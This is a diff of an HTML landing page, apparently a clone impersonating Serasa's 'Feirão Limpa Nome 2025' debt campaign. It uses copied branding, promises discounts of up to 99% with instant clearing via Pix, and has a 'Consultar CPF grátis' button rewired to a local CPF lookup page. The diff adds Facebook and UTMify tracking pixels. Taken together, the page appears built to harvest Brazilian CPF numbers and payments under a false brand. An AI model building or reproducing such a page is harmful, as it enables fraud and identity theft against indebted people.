@@ -1,10 +1,55 @@
 <!DOCTYPE html> <html lang=en style><meta charset=utf-8>
+
+<!-- Config do pixel face + utm -->
+
+<script
+      src="scripts/utms/latest-1.js"
+      data-utmify-prevent-subids=""
+      async=""
+      defer=""
+    ></script>
+    <script>
+      window.pixelId = "6939d79855be7738fa1fec49";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+</script>
+
+<script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n; n.push=n; n.loaded=!0; n.version='2.0';
+      n.queue=[]; t=b.createElement(e); t.async=!0;
+      t.src=v; s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+
+      // Inicializa o pixel normalmente
+      fbq('init', '769736156134629');
+
+      // Dispara o PageView SOMENTE após o UTMify carregar
+      document.addEventListener("utmify-loaded", () => {
+        fbq("track", "PageView");
+      });
+</script>
+
+  <noscript>
+    <img height="1" width="1" style="display:none"
+         src="https://www.facebook.com/tr?id=769736156134629&ev=PageView&noscript=1"/>
+  </noscript>
+  
+<!-- Config do pixel face + utm -->
+
 <meta name=viewport content="width=device-width, initial-scale=1.0">
 <meta name="description" content="Feirão Serasa Limpa Nome 2025, aproveite a oportunidade para negociar dívidas com até 99% de descontos. Ao pagar no Pix você tem seu nome limpo na hora!" />
 <title>Feirão</title>
   <meta property="og:title" content="Feirão Serasa Limpa Nome 2025" />
   <meta property="og:description" content="Aproveite a oportunidade para negociar dívidas com até 99% de descontos. Ao pagar no Pix você tem seu nome limpo na hora!" />
   <meta property="og:image" content="https://cdn.prod.website-files.com/633216ee83ef2df0cc0aaf86/63d060250f394c3f0025dc4f_serasa.png" />
+
 
 <link rel="icon" type="image/x-icon" href="../../1_6vufYTynT97AiH9uOytFpw.png">
 <style>body{user-select:none}</style>
@@ -390,9 +435,9 @@
  <div class="elementor-element elementor-element-61b8432 elementor-mobile-align-justify elementor-widget elementor-widget-button" data-id=61b8432 data-element_type=widget data-widget_type=button.default>
  <div class=elementor-widget-container>
  <div class=elementor-button-wrapper>
- <a class="elementor-button elementor-button-link elementor-size-sm" href="/cpf/?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=&amp;xcod=&amp;sck=" id=5703f844-493d-dc21-e9f4-e4e6b1a80a6b>
+ <a class="elementor-button elementor-button-link elementor-size-sm" href="../../consulta/serasa/cpf.html?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=&amp;xcod=&amp;sck=" id=8a550cd8-d48d-8793-2565-4b4ae32fbcdc>
  <span class=elementor-button-content-wrapper>
- <span class=elementor-button-text>Consultar CPF grátis</span>
+ <span id="botao2" class=elementor-button-text>Consultar CPF grátis</span>
  </span>
  </a>
  </div>
